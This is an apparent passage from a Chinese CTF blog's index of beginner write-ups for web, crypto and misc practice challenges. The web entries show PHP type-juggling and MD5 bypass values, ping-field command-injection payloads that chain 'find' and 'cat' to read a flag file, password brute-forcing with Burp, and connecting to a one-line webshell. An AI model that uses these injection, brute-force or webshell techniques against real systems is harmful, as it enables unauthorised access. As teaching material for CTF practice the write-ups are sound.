$_GET[‘num’]!=2333。iconv函数把抓取来过的utf-8编码的页面转成gbk编码，IGNORE就是说遇到无法转换的就跳过，忽略转换时的错误。因为中文情况下utf-8转换为gbk通常会发生乱码问题，所以可以用中文绕过第三个条件（我觉得是这个原因，我也不知道对不对。。）\n所以构造payload\n1?num=2333.3好\n至此绕过第一层if语句，接下来看第二层\n1if ($v1 &amp;&amp; $m!=$n &amp;&amp; md5($m)==md5($n) )\nmd5弱比较，在php中以0e开头的会被识别为科学记数法，结果均为0，所以可以构造1m=s878926199a&amp;n=s155964671a\n进行绕过。（结尾附0e开头的md5和原值）\n第三层\n1if($v2 &amp;&amp; !( $a == $b || $a == $c || $b == $c )&amp;&amp; !(md5($a) !== md5($b) || md5($b) !== md5($c) || md5($a) !== md5($c)))\nmd5的强碰撞，此时不能输入数组进行绕过，只能输入字符串，把！转化过来后是：\n1($a !== $b &amp;&amp; $a !== $c &amp;&amp; $b !== $c)&amp;&amp;(md5($a) === md5($b) &amp;&amp; md5($b) === md5($c) &amp;&amp; md5($a) === md5($c))\n这里推荐一篇文章 https:xz.aliyun.comt3161#toc-5\n下载fastcoll工具“快速 MD5 碰撞生成器”\n【下载地址： http:www.win.tue.nlhashclashfastcoll_v1.0.0.5.exe.zip 】\n本题要求三个MD5相同的文件，而fastcoll工具只能一次性生成两个文件，所以我们需要借助一个工具tail.exe【下载地址：https:www.trisunsoft.comtail-for-windows.htm 】以及windows下的type命令\n（windows下的tail命令，用于查看文件内容，并且可将指定长度内容输出到另一文件，）\n本次过程在windows cmd.exe执行，具体生成过程如下：\n1234D:fastcoll&gt;fastcoll_v1.0.0.5.exe -o jlzj0 jlzj1      #-o参数代表随机生成两个相同MD5的文件D:fastcoll&gt;fastcoll_v1.0.0.5.exe -p jlzj1 -o jlzj00 jlzj01  #-p参数代表根据jlzj1文件随机生成两个相同MD5的文件，注意：生成的MD5与jlzj1不同D:fastcoll&gt;tail.exe -c 128 jlzj00 &gt; a                #-c 128代表将jlzj00的最后128位写入文件a，这128位正是jlzj1与jlzj00的MD5不同的原因D:fastcoll&gt;type jlzj0 a &gt; jlzj10                    #这里表示将jlzj0和a文件的内容合并写入jlzj10\n到这里已经生成了jlzj00,jlzj01,jlzj10三个MD5相同的文件\n测试：123456789101112131415161718192021222324252627&lt;?php function  readmyfile($path)&#123;    $fh = fopen($path, &quot;rb&quot;);    $data = fread($fh, filesize($path));    fclose($fh);    return $data;&#125;echo &apos;二进制hash &apos;. md5( (readmyfile(&quot;jlzj00&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;rn&quot;;echo  &apos;URLENCODE &apos;. urlencode(readmyfile(&quot;jlzj00&quot;));echo &quot;&lt;br&gt;&lt;br&gt;rn&quot;;echo &apos;URLENCODE hash &apos;.md5(urlencode (readmyfile(&quot;jlzj00&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;rn&quot;;echo &apos;二进制hash &apos;.md5( (readmyfile(&quot;jlzj01&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;rn&quot;;echo  &apos;URLENCODE &apos;.  urlencode(readmyfile(&quot;jlzj01&quot;));echo &quot;&lt;br&gt;&lt;br&gt;rn&quot;;echo &apos;URLENCODE hash &apos;.md5( urlencode(readmyfile(&quot;jlzj01&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;rn&quot;;echo &quot;&lt;br&gt;&lt;br&gt;&quot;;echo &apos;二进制hash &apos;. md5( (readmyfile(&quot;jlzj10&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;rn&quot;;echo  &apos;URLENCODE &apos;. urlencode(readmyfile(&quot;jlzj10&quot;));echo &quot;&lt;br&gt;&lt;br&gt;rn&quot;;echo &apos;URLENCODE hash &apos;.md5(urlencode (readmyfile(&quot;jlzj10&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;rn&quot;;echo &quot;&lt;br&gt;&lt;br&gt;&quot;;\n在这个页面得到生成的三个文件的url编码，之后在bp传参给a、b、c，拿到flag\n好像也可以直接用python调用open并读取文件来传参..但咱不会写脚本..\n\n附：\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273740e开头的md5和原值： QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020\n","tags":["zkctf","web"],"path":"2019/09/27/zk月赛/","external_link":""},{"title":"攻防世界crypto新手wp（1）","date":"2019-09-24T15:55:33.000Z","content":"转轮机加密\n你俩继续往前走，来到了前面的下一个关卡，这个铺面墙上写了好多奇奇怪怪的 英文字母，排列的的整整齐齐，店面前面还有一个大大的类似于土耳其旋转烤肉的架子，上面一圈圈的 也刻着很多英文字母，你是一个小历史迷，对于二战时候的历史刚好特别熟悉，一拍大腿：“嗨呀！我知道 是什么东西了！”。提示：托马斯·杰斐逊\n\n1234567891011121314151617文件：1:  &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;2:  &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;3:  &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;4:  &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;5:  &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;6:  &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;7:  &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;8:  &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;9:  &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;11：&lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;12：&lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;13：&lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;密钥为：2,3,7,5,13,12,9,1,8,10,4,11,6密文为：NFQKSEVOQOFNP\n把文件重新排序，并把密文转到第一个位置，发现FIREINTHEHOLE换成小写得到flag：cyberpeace{fireinthehole}\neasy_RSA\n解答出来了上一个题目的你现在可是春风得意，你们走向了下一个题目所处的地方 你一看这个题目傻眼了，这明明是一个数学题啊！！！可是你的数学并不好。扭头看向小鱼，小鱼哈哈一笑 ，让你在学校里面不好好听讲现在傻眼了吧~来我来！三下五除二，小鱼便把这个题目轻轻松松的搞定了。flag格式为cyberpeace{小写的你解出的答案}\n\n123文件：在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17求解出d\n其实就是个数学题，不过首先要知道1234d*e≡1(mod φ(n)),又p、q为质数，所以φ(n)=(p-1)*(q-1),即d*e≡1(mod(p-1)*(q-1)\n把e p q的值代入得到d，加上格式即为flag：cyberpeace{125631357777427553}\n不仅仅是Morse\n“这个题目和我们刚刚做的那个好像啊但是为什么按照刚刚的方法做出来答案却不对呢” ，你奇怪的问了问小鱼，“可能是因为还有一些奇怪的加密方式在里面吧，我们在仔细观察观察”。两个人 安安静静的坐下来开始思考，很耐心的把自己可以想到的加密方式一种种的过了一遍，十多分钟后两个人 异口同声的说“我想到了！”。一种食物,格式为cyberpeace{小写的你解出的答案}\n\n12文件：--.--.--..--.--......--.-.....-...-...--.-.--.----......-...--.--...-.-.----....................-.-.-.-.--....-.--...-...-....-.--...-....-.-.-.-.-.-.-.--....-.--....--....-.-.-.-.-.-.--...-....--....-.-.--...-....-.-.--...-....-.--....-.-.-.--....--....-.--....-.-.--...-....--....-.-.--....-.-.--....-.--....--...-....-.--...-...-....--....-.-.--....--....--...-....-.-.--...-....--....-.-.--....-.--....-.--....-.-.-.--...-....--...-....-.--...-....-.--....-.--....-.-.--....-.--....-.--....-.--....--....-.--...-....--....-.-.-.--...-....--....-.--...-....-\n进行morse解密，得到1may be have another decodehhhhaaaaabaabbbaabbaaaaaaaabaababaaaaaaabbabaaabbaaabbaabaaaababaabaaabbabaaabaaabaababbaabbbabaaabababbaaabbabaaabaabaabaaaabbabbaabbaabaabaaabaabaabaababaabbabaaaabbabaabba\n题目提示了一种食物，结果我就是没想出来…后来才知道是培根..(我太zz了)\n培根密码所用的密码是一种本质上用二进制数设计的，没有用通常的0和1来表示，而是采用a和b培根密码加密有两种方式\n12345678910111213141516方式一：A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaab K ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab T baabb U babaa V babab W babba X babbb Y bbaaa Z bbaab  方式二： a AAAAA g AABBA n ABBAA t BAABA b AAAAB h AABBB o ABBAB u-v BAABB c AAABA i-j ABAAA p ABBBA w BABAA d AAABB k ABAAB q ABBBB x BABAB e AABAA l ABABA r BAAAA y BABBA f AABAB m ABABB s BAAAB z BABBB\n用在线工具解密(虽然大家都是自己写脚本)得到flag：cyberpeace{attackanddefenceworldisinteresting}\n","tags":["writeup","攻防世界"],"path":"2019/09/24/攻防世界crypto新手wp（1）/","external_link":""},{"title":"攻防世界crypto新手wp","date":"2019-09-23T15:20:14.000Z","content":"base64\n元宵节灯谜是一种古老的传统民间观灯猜谜的习俗。 因为谜语能启迪智慧又饶有兴趣，灯谜增添节日气氛，是一项很有趣的活动。 你也很喜欢这个游戏，这不，今年元宵节，心里有个黑客梦的你，约上你青梅竹马的好伙伴小鱼， 来到了cyberpeace的攻防世界猜谜大会，也想着一展身手。 你们一起来到了小孩子叽叽喳喳吵吵闹闹的地方，你俩抬头一看，上面的大红灯笼上写着一些奇奇怪怪的 字符串，小鱼正纳闷呢，你神秘一笑，我知道这是什么了。\n\n1文件Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9\n直接找在线解密网站进行解密得到flag：cyberpeace{Welcome_to_new_World!}\nCaesar\n你成功的解出了来了灯谜，小鱼一脸的意想不到“没想到你懂得这么多啊！” 你心里面有点小得意，“那可不是，论学习我没你成绩好轮别的我知道的可不比你少，走我们去看看下一个” 你们继续走，看到前面也是热热闹闹的，同样的大红灯笼高高挂起，旁边呢好多人叽叽喳喳说个不停。你一看 大灯笼，上面还是一对字符，你正冥思苦想呢，小鱼神秘一笑，对你说道，我知道这个的答案是什么了\n\n1文件oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;\n根据提示知道是凯撒加密，找到在线解密网站，位移为12时得到flag：cyberpeace{you_have_learned_caesar_encryption}\nMorse\n小鱼得意的瞟了你一眼，神神气气的拿走了答对谜语的奖励，你心里暗暗较劲 想着下一个谜题一定要比小鱼更快的解出来。不知不觉你们走到了下一个谜题的地方，这个地方有些奇怪。 上面没什么提示信息，只是刻着一些0和1，感觉有着一些奇怪的规律，你觉得有些熟悉，但是就是想不起来 这些01代表着什么意思。一旁的小鱼看你眉头紧锁的样子，扑哧一笑，对你讲“不好意思我又猜到答案了。”(flag格式为cyberpeace{xxxxxxxxxx},均为小写)\n\n1文件11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110\n把1转换成-，0转换成.，得到1-- --- .-. ... . -.-. --- -.. . .. ... ... --- .. -. - . .-. . ... - .. -. --.\n使用在线解密网站http:www.zou114.commesm得到morsecodeissointeresting，加上格式得到flag：cyberpeace{morsecodeissointeresting}\nRailfence\n被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走， 一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。 到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的 图画，上面画着一个农妇在栅栏里面喂5只小鸡，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。\n\n1文件ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g\n栅栏密码分为传统型和WWW型两种，传统型解密网站http:www.zjslove.com3.decodezhalanindex.html，这道题用传统型的方法解发现很奇怪125字一栏：cyperrocae&#123;gireeol&#125;eahfocec_gnbip_g7字一栏：cebgccfe&#125;_en&#123;eohplprgecrayoii_aoreg\n所以这道题可能是WWW型：\n1234567WWW型栅栏密码：例如字符串：123456789\tkey=3\t1----5----9  让数字以W型组织，同样是三组，但每组的数量不一定相同\t-2--4-6--8\t--3----7--\t加密密文：159246837\nWWW型解密网站：http:www.atoolbox.netTool.php?Id=777，得到flag：cyberpeace{railfence_cipher_gogogo}\n","tags":["writeup","攻防世界"],"path":"2019/09/23/攻防世界crypto新手wp/","external_link":""},{"title":"攻防世界crypto新手wp（2）","date":"2019-09-26T15:41:59.000Z","content":"记一下前天写的一道密码题\nNormal_RSA\n你和小鱼走啊走走啊走，走到下一个题目一看你又一愣，怎么还是一个数学题啊 小鱼又一笑，hhhh数学在密码学里面很重要的！现在知道吃亏了吧！你哼一声不服气，我知道数学 很重要了！但是工具也很重要的，你看我拿工具把他解出来！你打开电脑折腾了一会还真的把答案 做了出来，小鱼有些吃惊，向你投过来一个赞叹的目光\n\n主要考察RSAtool的使用，github 下载链接https:github.comiusrsatool\n[工具]\n1openssl和rsatool\nopenssl在kali虚拟机里有，使用方法参考https:www.cnblogs.comyangxiaolanp6256838.html\n这道题给了两个文件，一个是加密过的的flag.enc，另一个是公钥pubkey.pem。先用openssl提取出pubkey.pem中的参数\n1openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem\n得到Modulus（16）进制把十六进制转化为十进制，转化地址  https:tool.luhexconvert\n结果：187924348264132406875276140514499937145050893665602592992418171647042491658461\n用在线工具分解成两个素数，网址http:www.factordb.comindex.php?query=87924348264132406875276140514499937145050893665602592992418171647042491658461，得到12275127860351348928173285174381581152299 319576316814478949870590164193048041239\n知道两个素数，随机定义大素数e,求出密钥文件，命令是：1python rsatool.py -o private.pem -e 65537 -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239\n然后我就出现了问题在这个地方emmm，可能是我的工具有问题emmmm我要存疑了\n如果没有问题的话正常情况下会生成一个private.pem的文件，最后解密得到flag\n1openssl rsautl -decrypt -in flag.enc -inkey private.pem\n\n","tags":["writeup","攻防世界"],"path":"2019/09/26/攻防世界crypto新手wp（2）/","external_link":""},{"title":"攻防世界misc新手wp（一）","date":"2019-07-24T14:09:19.000Z","content":"攻防世界misc新手题4-6题\npdf根据题目描述可知，flag可能会隐藏在图片下面。将图片移开的方法：\n\n用pdf编辑工具使图片缩小可以看到图片后面的flag\n利用在线工具：https:app.xunjiepdf.compdf2word 将pdf转换为word，从而移开图片\n\nSimpleRAR解压后只有一个txt文件,上面写着flag is not here,将压缩包用winhex打发现RAR里面有一个图片，但是没有解压出来，原因是这个压缩包被损坏\n更改RAR对png文件头的编码，把A8 3C 7A中的7A改成74，保存，重新解压，得到一个纯白图片\n把图片拖进winhex发现是个gif，用stegsolve打开选择帧功能模块，又看到两张纯白的图片。。。（后来才知道这两张纯白的图片，调节颜色后就能得到两张残缺的二维码图片。。。）\n。。而我选择先用PS打开secret.gif，有两个图层（题目中的双图层），分离后保存，再用Stegsolve分别打开，得到两张残缺的二维码图片使用ps将二维码合并补齐，扫描得到flag\n坚持60s使用java反编译工具，查看源码，看到经过base64加密后的flag，解密得到flagJD-GUI（Java反编译工具）下载地址： https:www.cr173.comsoft5606.html\n","tags":["writeup","攻防世界"],"path":"2019/07/24/攻防世界misc新手wp（一）/","external_link":""},{"title":"攻防世界web新手wp（四）","date":"2019-08-01T10:07:44.000Z","content":"攻防世界web新手题8、12题一个星期前的三道web新手题一直拖着没写wp…今天补出来。昨天一人跟我说我博客半年没更新了，我气急败坏的怼回去说我顶多一周没更新，结果打开博客一看，从24号到31号刚好一周…七月份放假后可以说过的相当放松..因为除了每天练两个小时的琴准备八月二号的考级外什么也没干（手动微笑），所以趁着八月份的开始我也要好好开始了(再次微笑)，毕竟再不开始学python借的书就白带回来了，该被某人嘲笑了(依然微笑)。然后就是 该读书了，七月又是一本书没读的七月(微笑)，真尴尬呢(微笑)，今天就从《第七天》开始读吧。\n\nweak_auth因为看到题目是随手设了一个密码，所以我就随手试了一下123456，结果直接拿到了flag。。\n先根据弹出的弹窗提示确定用户名为admin，然后查看源码，根据提示需要一个字典，因此需要进行爆破\n使用burp进行爆破\n将抓到的包send to intruder后设置payload，选择一个字典，开始爆破\n这里提供别人github中的一个字典：https:github.comrootphantomerBlasting_dictionary\n发现密码为123456时长度和其他不同\n查看响应包，得到flag\nwebshell根据题目猜测是一句话木马，打开题目看出这个一句话的密码是” shell “于是打开菜刀，添加，输入url，输入密码shell，连接成功，得到flag\ncommand_execution\n\n\nWAF：Web应用防护系统，是专门为保护基于web应用程序而设计的，不像传统的防火墙，是基于联网地址和端口号来监控和阻止数据包。\n看到ping命令就可以利用截断来执行新的命令。首先测试所有的截断符号，如&amp;、|、||、;\n\n\n打开题目，先尝试ping本地地址127.0.0.1\n然后尝试找到所有的.txt文件\n1127.0.0.1 &amp;&amp; find  -name &quot;*.txt&quot;\n发现flag.txt\n于是查看flag.txt文件，得到flag\n1127.0.0.1 &amp;&amp; cat homeflag.txt\n\n知识点：\n命令执行漏洞当应用需要调用一些外部程序去处理内容时，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，就可将恶意系统命令注入到正常命令中，造成命令执行攻击。\n在操作系统中，“&amp;、|、||”都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令\n\nA&amp;&amp;B，表示A命令语句执行成功，然后执行B命令语句\nA&amp;B，表示简单的拼接，A命令语句和B命令语句没有制约关系\nA|B，表示A命令语句的输出，作为B命令语句的输入执行\nA||B，表示A命令语句执行失败，然后才执行B命令语句\nA;B，表示先执行A，再执行B\n\n推荐文章：https:www.freebuf.comcolumn154670.html\n","tags":["writeup","攻防世界"],"path":"2019/08/01/攻防世界web新手wp（四）/","external_link":""},{"title":"攻防世界crypto新手wp（3）","date":"2019-10-17T12:00:00.000Z","content":"\n混合编码12文件：JiM3NjsmIzEyMjsmIzY5OyYjMTIwOyYjNzk7JiM4MzsmIzU2OyYjMTIwOyYjNzc7JiM2ODsmIzY5OyYjMTE4OyYjNzc7JiM4NDsmIzY1OyYjNTI7JiM3NjsmIzEyMjsmIzEwNzsmIzUzOyYjNzY7JiMxMjI7JiM2OTsmIzEyMDsmIzc3OyYjODM7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiMxMDc7JiMxMTg7JiM3NzsmIzg0OyYjNjU7JiMxMjA7JiM3NjsmIzEyMjsmIzY5OyYjMTIwOyYjNzg7JiMxMDU7JiM1NjsmIzEyMDsmIzc3OyYjODQ7JiM2OTsmIzExODsmIzc5OyYjODQ7JiM5OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzUwOyYjNzY7JiMxMjI7JiM2OTsmIzEyMDsmIzc4OyYjMTA1OyYjNTY7JiM1MzsmIzc4OyYjMTIxOyYjNTY7JiM1MzsmIzc5OyYjODM7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiM5OTsmIzExODsmIzc5OyYjODQ7JiM5OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzExOTsmIzc2OyYjMTIyOyYjNjk7JiMxMTk7JiM3NzsmIzY3OyYjNTY7JiMxMjA7JiM3NzsmIzY4OyYjNjU7JiMxMTg7JiM3NzsmIzg0OyYjNjU7JiMxMjA7JiM3NjsmIzEyMjsmIzY5OyYjMTE5OyYjNzc7JiMxMDU7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiM2OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzExOTsmIzc2OyYjMTIyOyYjMTA3OyYjNTM7JiM3NjsmIzEyMjsmIzY5OyYjMTE5OyYjNzc7JiM4MzsmIzU2OyYjMTIwOyYjNzc7JiM4NDsmIzEwNzsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzEyMDsmIzc2OyYjMTIyOyYjNjk7JiMxMjA7JiM3ODsmIzY3OyYjNTY7JiMxMjA7JiM3NzsmIzY4OyYjMTAzOyYjMTE4OyYjNzc7JiM4NDsmIzY1OyYjMTE5Ow==\n打开文件发现是base64，使用在线解密工具http:tool.oschina.netencrypt?type=3 得到unicode编码，再使用在线解密工具http:tool.oschina.netencode 又得到base64编码，再解密一次，得到ascll码，转换之后得到flag\neasychallenge题目给的文件为.pyc文件，先将其反编译成.py文件。反编译可以下载uncompyle6工具或者使用在线反编译工具https:tool.lupyc得到.py文件如下：\n123456789101112131415161718192021222324252627282930313233import base64def encode1(ans):    s = &apos;&apos;    for i in ans:        x = ord(i) ^ 36        x = x + 25        s += chr(x)        return sdef encode2(ans):    s = &apos;&apos;    for i in ans:        x = ord(i) + 36        x = x ^ 36        s += chr(x)        return sdef encode3(ans):    return base64.b32encode(ans)flag = &apos; &apos;print &apos;Please Input your flag:&apos;flag = raw_input()final = &apos;UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===&apos;if encode3(encode2(encode1(flag))) == final:    print &apos;correct&apos;else:    print &apos;wrong&apos;\n根据代码，写出解密脚本：\n123456789101112131415#!usrbinenv python# encoding: utf-8import base64a = &apos;UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===&apos;b = base64.b32decode(a)s = &apos;&apos;for i in b:    s += chr((ord(i) ^ 36) - 36)l = &apos;&apos;for i in s:    l += chr((ord(i) - 25) ^ 36)print (&apos;flag is &apos;,l)\n得到flag\n\n因为之前没有学习过python，所以从最基础的记录下\n\n Python不用推荐用分号，而是用回车\n def：相当于define，用来定义函数\n\n1234567# 例：简单的函数使用# 定义函数def hello():    print &apos;hello python!&apos;     # 调用函数        hello()\n\n for in循环：是一种循环结构，常用于遍历可迭代的对象\n 在python中，for…else中的else语句会在循环正常执行完（即for不是通过break跳出而中断的）的情况下执行一次，while … else也是一样。\n ord()函数：接受一个参数，返回值是int整数，返回其对应的ASCII\n chr()函数：返回当前整数对应的 ASCII 字符，范围在range(256)内，参数可以是可以是10进制也可以是16进制的形式的数字\n base64.b32encode(s)：使用Base32编码字符串。s是要编码的字符串。\n\n幂数加密12文件：8842101220480224404014224202480122\n百度搜到的二进制幂数加密：链接\n而本题不是二进制的幂数加密，而是01248密码，又称云影密码，关于01248密码的链接\n这种密码由0,1,2,4,8这几个数组成，但是以加法的形式可以得到0~9的各个数字，比如28=0,14=5,124=7，再用得到的数1-26表示字母的A-Z，0来作为分隔。\n本题中密文：8842101220480224404014224202480122\n8+8+4+2+1=23=W，依次类推就可以得到明文WELLDONE，从而得到flag\n\n附上一个工具链接 ctf.ssleye.com?tdsourcetag=s_pcqq_aiomsg\n","tags":["writeup","攻防世界"],"path":"2019/10/17/攻防世界crypto新手wp（3）/","external_link":""},{"title":"攻防世界web新手wp（一）","date":"2019-07-17T13:01:31.000Z","content":"攻防世界web新手题1-3题\nMiscgive_you_flag修复二维码扫描得到flag打开gif图会看见丘比龙数完钞票会展示二维码，使用Stegsolve打开文件选择Frame Browser帧浏览器对动图进行分解,得到含有二维码的图片，发现二维码残缺，随便找一个二维码使用photoshop补上缺口，得到完整二维码，扫描得到flag\nWebview_source\nX老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。\n\nCtrl+U查看源代码得到flag\nget_post\nX老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？\n\n考察HTTP两种请求方法get和post，使用火狐+hackbar传参，得到flag\nrobots\nX老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。\n\n百度Robots协议，了解到Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。\n在网站根目录下放一个robots.txt文本文件（如 https:www.taobao.comrobots.txt ），里面可以指定不同的网络爬虫能访问的页面和禁止访问的页面，指定的页面由正则表达式表示。网络爬虫在采集这个网站之前，首先获取到这个robots.txt文本文件，然后解析到其中的规则，然后根据规则来采集网站的数据。\n于是查询robots.txt读取文件得到flag\n123456789101112131415161718192021222324252627Robots协议举例禁止所有机器人访问    User-agent: *    Disallow: 允许所有机器人访问    User-agent: *    Disallow: 禁止特定机器人访问    User-agent: BadBot    Disallow: 允许特定机器人访问    User-agent: GoodBot    Disallow: 禁止访问特定目录    User-agent: *    Disallow: images仅允许访问特定目录    User-agent: *    Allow: images    Disallow: 禁止访问特定文件    User-agent: *    Disallow: *.html$仅允许访问特定文件    User-agent: *    Allow: *.html$    Disallow: \n","tags":["writeup","攻防世界"],"path":"2019/07/17/攻防世界web新手wp（一）/","external_link":""},{"title":"攻防世界web新手wp（三）","date":"2019-07-21T09:58:46.000Z","content":"攻防世界web新手题8-12题\nwebxff_referer\nX老师告诉小宁其实xff和referer是可以伪造的。\n\n根据描述信息，知道题目应该与xff和referer相关，进入题目，看到\n于是用brup抓包，在http头加一条 X-Forwarded-For: 123.123.123.123发送请求看到必须来自谷歌，于是再增加一条 Referer: https:www.google.com再次发送请求得到flag\n本题涉及知识点：XFF - IP欺骗XFF即”X-Forwarded-For”字段，设置此字段可以伪造IP地址，这样部分服务器会认为是客户端经过代理访问自己，而其真实IP即为伪造IP地址。此字段在http头部增加即可生效。\nReferer伪造Referer是HTTP协议中的一个请求报头，用于告知服务器用户的来源页面。要注意的是，referer是由浏览器自动为我们加上的，但并不是所有浏览器都会设置该值。和XFF一样，referer可以伪造，并不可信。\nsimple_php\n小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。\n\n打开题目看到源代码\n123456789101112131415&lt;?php show_source(__FILE__); include(&quot;config.php&quot;); $a=@$_GET[&apos;a&apos;]; $b=@$_GET[&apos;b&apos;]; if($a==0 and $a)&#123;     echo $flag1; &#125; if(is_numeric($b))&#123;     exit(); &#125; if($b&gt;1234)&#123;     echo $flag2; &#125; ?&gt;\n分析代码可知，若想得到flag1需要满足条件$a==0且$a不为0，所以可以令a=0a.\n若想得到flag2需要满足条件&amp;b不为数字或数字字符串且&gt;1234，可以用b=12345a绕过。\n所以构造url：\n1http:111.198.29.45:34608index.php?a=0a&amp;b=12345a\n回车得到flag\n本题涉及知识点：php弱类型比较php中有两种比较的符号： == 与 ===\n== 在进行比较的时候，会先将字符串类型转化成相同，再比较 如果一个数值和字符串进行比较的时候，会将字符串转换成数值再比较。\n=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较\n所以本题中令a=0a会先将0a转换成0再与0比较\nis_numeric()函数is_numeric() 函数用于检测变量是否为数字或数字字符串。若变量为数字或数字字符串，则if()语句为真。审计代码可知本题中要令&amp;b不为数字或数字字符串，所以令b=12345a，同样因为php是弱类型语言，12345a在与1234比较时会先将12345a转换成12345，于是得到flag2\n","tags":["writeup","攻防世界"],"path":"2019/07/21/攻防世界web新手wp（三）/","external_link":""},{"title":"攻防世界web新手wp（二）","date":"2019-07-18T14:50:40.000Z","content":"攻防世界web新手题4-6题\nwebbackup\nX老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！\n\n这道题考察的是备份文件漏洞（Backup-File Artifacts），该漏洞可能存在于编辑器自动备份，版本控制系统备份和开发者手动备份。相关链接https:www.4hou.comtechnology1958.html\n于是知道了index.php的备份文件index.php.bak,下载文件得到flag\n\n补充：后缀名为bak的文件是备份文件\n\ncookie\nX老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’\n\nCookie，指某些网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据。\n打开题目，F12打开开发者工具， 查看cookies，发现一个php网页，尝试访问拿到新的提示，查看响应头，拿到flag\ndisabled_button\nX老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？\n\n获取在线场景查看网页，发现一个不能按的按钮，猜测通过这个按钮可以得到flag，查看源代码，发现按钮设置了disabled属性，删除这个属性，再点击按钮，拿到flag\n","tags":["writeup","攻防世界"],"path":"2019/07/18/攻防世界web新手wp（二）/","external_link":""},{"title":"2019ISCC Misc","date":"2019-06-01T09:52:23.000Z","content":"2019ISCC Misc全部wp\n01 隐藏的信息题目给出的文件10126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113\n因为二进制以0b开头八进制以0开头十六进制以0x开头，得知文件中是八进制数，需要将其转换为字符123456789101112#include&lt;iostream&gt;using namespace std;int main()&#123;\tchar 